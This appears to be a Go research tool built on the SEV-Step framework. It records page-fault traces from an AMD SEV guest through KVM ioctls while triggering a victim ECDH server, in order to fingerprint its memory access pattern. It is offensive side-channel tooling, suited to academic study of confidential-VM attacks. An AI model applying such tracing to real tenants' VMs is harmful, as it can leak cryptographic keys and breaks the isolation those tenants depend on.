//Triggers the ecdh dummy server and records page faults  until the server replies. Has many options to configure recording
//Instead of reporting every fault to userspace, this version uses the batch API to record page faults in kernel
//space and handle re-tracking there as well. Only in the end we query once to get all faults
package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"pfFingerprint/trigger"
	"strconv"
	"strings"

	"github.com/UzL-ITS/sev-step/sevStep"

	"log"
	"os"
	"time"
)

//initTracking if allowList != nil only the gpas in the list are tracked, otherwise all pages are tracked
func initTracking(ioctlAPI *sevStep.IoctlAPI, allowList []uint64, trackType sevStep.PageTrackMode) error {
	if allowList == nil {
		log.Printf("Tracking all pages\n")
		if err := ioctlAPI.CmdTrackAllPages(trackType); err != nil {
			return fmt.Errorf("CmdTrackAllPages failed : %v", err)
		}

		return nil
	}

	log.Printf("tracking the %v pages from allowList\n", len(allowList))
	for _, gpa := range allowList {
		if err := ioctlAPI.CmdTrackPage(gpa, trackType); err != nil {
			return fmt.Errorf("CmdTrackPage failed : %v", err)
		}
	}

	return nil
}

//marshallEvent accepts "plain" and "json" as formats and returns the encoding as bytes
func marshallEvent(e *sevStep.Event, format string) ([]byte, error) {
	var data []byte
	var err error
	switch format {
	case "json":
		data, err = json.Marshal(e)
		if err != nil {
			return nil, fmt.Errorf("failed to marshal event to json")
		}
		data = append(data, []byte("\n")...) //add new line
		return data, nil
	case "plain":
		pfErrAsString, err := sevStep.ErrorCodeToString(e.ErrorCode)
		if err != nil {
			log.Printf("failed to convert pf err code to string : %v", err)
			pfErrAsString = "<error>"
		}
		retiredInstrDelta := "not found"
		if e.HaveRetiredInstructions {
			retiredInstrDelta = fmt.Sprintf("%d", e.RetiredInstructions)
		}
		data = []byte(fmt.Sprintf("%s Error Bits(%s) Retired Instructiosn Delta = %s\n", e.String(), pfErrAsString, retiredInstrDelta))
		return data, nil
	default:
		return nil, fmt.Errorf("unknown format \"%v\" requested", format)

	}

}

func main() {

	triggerURI := flag.String("triggerURI", "http://localhost:8080", "Either http://someAddress:port or ssh://someHost:port")
	out := flag.String("out", "pf-log.txt", "path to write page fault events to")
	trackingTypeParam := flag.String("tracking", "access", "values: {access,execute}. Determines tracking type")
	format := flag.String("format", "plain", "{plain,json}, format event output")
	retrack := flag.Bool("retrack", true, "re-track pages")
	allowListPath := flag.String("allowList", "", "only track pages from this list")
	iterations := flag.Uint("iterations", 0, "Iterations for tracking If set to 0 iterations are starting by pressing enter")
	cpu := flag.Int("cpu", -1, "Guest must be pinned to this virtual cpu")
	getRIP := flag.Bool("getRIP", true, "Try to get RIP for page fault events. Works only for plain VMs and debug SEV-ES VMs")
	maxEvents := flag.Uint64("maxEvents", 50000000, "Maximum amount of events recordable in one batch tracking run")

	flag.Parse()

	victimTrigger, err := trigger.NewTriggerFromURI(*triggerURI)
	if err != nil {
		log.Printf("Failed to parse triggerURI :%v", err)
	}

	var allowList []uint64 = nil
	if *allowListPath != "" {
		allowListFile, err := os.Open(*allowListPath)
		if err != nil {
			log.Fatalf("Failed to open allow list file : %v\n", err)
		}
		defer allowListFile.Close()
		sc := bufio.NewScanner(allowListFile)
		sc.Split(bufio.ScanLines)
		allowList = make([]uint64, 0)
		for sc.Scan() {
			line := sc.Text()
			line = strings.Trim(line, " \n")

			gpa, err := strconv.ParseUint(line, 0, 64)
			if err != nil {
				log.Fatalf("Failed to parse allow list entry %v : %v\n", line, err)
			}
			allowList = append(allowList, gpa)
		}
		if err := sc.Err(); err != nil {
			log.Fatalf("allowList scanner error : %v", err)
		}
	}

	var trackType sevStep.PageTrackMode
	switch *trackingTypeParam {
	case "access":
		trackType = sevStep.PageTrackAccess
	case "execute":
		trackType = sevStep.PageTrackExec
	case "write":
		trackType = sevStep.PageTrackWrite
	default:
		log.Printf("Please set valid value for \"tracking\" param\n")
		flag.PrintDefaults()
		return
	}

	if *format != "plain" && *format != "json" {
		log.Printf("Please set valid value for \"format\" param\n")
		flag.PrintDefaults()
		return
	}

	if *cpu == -1 {
		log.Printf("Please set valid value for \"cpu\" param\n")
		flag.PrintDefaults()
		return
	}

	outFile, err := os.Create(*out)
	if err != nil {
		log.Printf("Failed to open outFile : %v", err)
		return
	}
	defer outFile.Close()
	outWriter := bufio.NewWriter(outFile)
	defer outWriter.Flush()

	log.Printf("getRIP? %v\n", *getRIP)
	ioctlAPI, err := sevStep.NewIoctlAPI("/dev/kvm", *getRIP)
	if err != nil {
		log.Fatalf("Failed to init ioctl API : %v", err)
	}
	defer ioctlAPI.Close()

	var haveNextRound func() bool
	abort := false

	//prepare callback function handling the iteration count
	if *iterations != 0 {
		log.Printf("Doing %v iterations\n", *iterations)
		remaining := int(*iterations)
		haveNextRound = func() bool {
			remaining--
			ok := remaining >= 0 && !abort
			if ok {
				log.Printf("%v iterations remaining\n", remaining)
			}
			return ok
		}
	} else {
		fmt.Println("Press enter to trigger signature. Press CTL-C, Enter to quit")
		sc := bufio.NewScanner(os.Stdin)
		sc.Split(bufio.ScanLines)
		haveNextRound = func() bool {
			return sc.Scan() && !abort
		}
	}

	totalProcessedEvents := uint64(0)
	//main loop
	for haveNextRound() {
		if _, err := outWriter.WriteString(fmt.Sprintf("Start %v\n", time.Now().Format(time.StampNano))); err != nil {
			log.Printf("Failed to write start of ecdh event : %v", err)
			return
		}

		//setup tracking

		log.Printf("Initialize tracking\n")
		if err := ioctlAPI.CmdBatchTrackingStart(trackType, *maxEvents, *cpu, *retrack); err != nil {
			log.Printf("Failed to setup batch tracking : %v", err)
			return
		}
		if err := initTracking(ioctlAPI, allowList, trackType); err != nil {
			log.Printf("initTracking failed : %v", err)
			return
		}

		//trigger target

		updateTicker := time.NewTicker(10 * time.Second)
		go func() {
			log.Printf("Starting update ticker\n")
			defer log.Printf("Closing update ticker\n")
			for {
				<-updateTicker.C
				count, err := ioctlAPI.CmdBatchTrackingEventCount()
				if err != nil {
					log.Printf("Failed to fetch event count in batch cycle : %v", err)
					return
				}
				log.Printf("%v events and growing...", count)
			}
		}()
		log.Printf("Triggering Victim")
		if _, err := victimTrigger.Execute(); err != nil {
			log.Printf("Failed to execute victim trigger : %v", err)
			//return
		}
		log.Printf("Victim done\n")

		//get events and save them

		eventsDuringVictim, err := ioctlAPI.CmdBatchTrackingEventCount()
		if err != nil {
			log.Printf("Failed to fetch event count in batch cycle : %v", err)
			return
		}

		if eventsDuringVictim == 0 {
			log.Printf("No events during victim execution. There is probably a bug,exiting")
			return
		}

		events, errDuringBatch, err := ioctlAPI.CmdBatchTrackingStopAndGet(eventsDuringVictim)
		if err != nil {
			log.Printf("Failed to get events in batch : %v", err)
			return
		}
		if errDuringBatch {
			log.Printf("There was an error during batch recording. Check dmesg for more information. Proceding!")
		}
		log.Printf("Save output file...")
		for _, v := range events {
			data, err := marshallEvent(v, *format)
			if err != nil {
				log.Printf("Failed to marshall event : %v", err)
				return
			}
			if _, err := outWriter.Write(data); err != nil {
				log.Printf("Failed to write event to file : %v", err)
				return
			}
		}
		totalProcessedEvents += eventsDuringVictim

		if _, err := outWriter.WriteString(fmt.Sprintf("Stop %v\n", time.Now().Format(time.StampNano))); err != nil {
			log.Printf("Failed to write start of ecdh event : %v", err)
			return
		}

		if err := ioctlAPI.CmdUnTrackAllPages(trackType); err != nil {
			log.Printf("CmdUnTrackAllPages failed : %v", err)
			return
		}
	}

	log.Printf("Total processed events %v", totalProcessedEvents)

}
